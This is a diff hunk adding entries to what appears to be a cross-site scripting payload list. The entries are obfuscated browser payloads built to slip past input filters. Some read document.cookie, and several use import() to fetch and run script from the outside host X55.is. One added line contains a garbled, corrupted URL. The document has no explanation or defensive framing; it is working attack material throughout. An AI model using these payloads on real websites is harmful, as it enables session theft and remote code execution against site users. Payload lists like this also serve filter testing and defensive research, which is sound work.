@@ -6,12 +6,29 @@ x"//oNeRrOr=`/AmoloHT/`
 "><u>XSS By AmoloHT</u><marquee+onstart='alert(document.cookie)'>XSS
 <noscript><p title="</noscript><img src=x  onerror=alert(1)>">
 <svg onload=alert%26%230000000040"1")>
+<Svg/Onload=top%5B"al"%2B"ert%5D(1)//
+<Svg Id=JavaScrip OnLoad=location=id+'t:/*'+URL>
 <svg><set onbegin=d=document,b='`',d['loca'+'tion']='javascript&colon;aler'+'t'+b+domain+b>
 <svg><set onbegin=d=document,b=/`/.source,d[/loca/.source+/tion/.source]=/javascript&colon;aler/.source+/t/.source+b+domain+b>
+`/alert?.(1)'"><Svg/OnLoad='`
+<a/href="/alert(1)/">
 <a href=//X55.is autofocus onfocus=import(href)>
 <a href=javascript:'\74svg/onload\75alert\501\51\76'>
 <a href="javas%09cript:[1].map(top['ale'+'rt'])">
+<a href="/*">*/)});function+__MobileAppList(){alert(1)}//>
 <Img Src="//X55.is/> "OnError=import(src)//
 <Img Src="javascript:alert(1)> 1"OnError=location=src//
 javascript:&#37&#54&#49lert(1)
 javascript:%26%2337%26%2354%26%2349lert(1)
+JavaScript%26%2358confirm(1)
+JavaScript%26%2358AB:confirm(1)
+JavaScript%26%2358%0Bconfirm(1)
+JavaScript%26%2358$;confirm(1)
+JavaScript%26%2358$?confirm(1):0
+JavaScript%26%2358top?confirm(1):0
+JavaScript://%250Aalert?.(1)//
+<Tag OnEvent="alert/*>*/(1)"
+<Svg OnLoad=confirm(1)>%C0%BCSvg%C0%A0OnLoad%C0%BDconfirm%C0%A81%C0%A9%C0%BE
+<Svg OnLoad=import('//X55.is')>%C0%BCSvg%C0%A0OnLoad%C0%BDimport%C0%A8%C0%A7%C0%AF%C0%http://AFX55.is%C0%A7%C0%A9%C0%BE
+function/**/Date(){alert(1)}
+function/**/RegExp(){alert(1)}
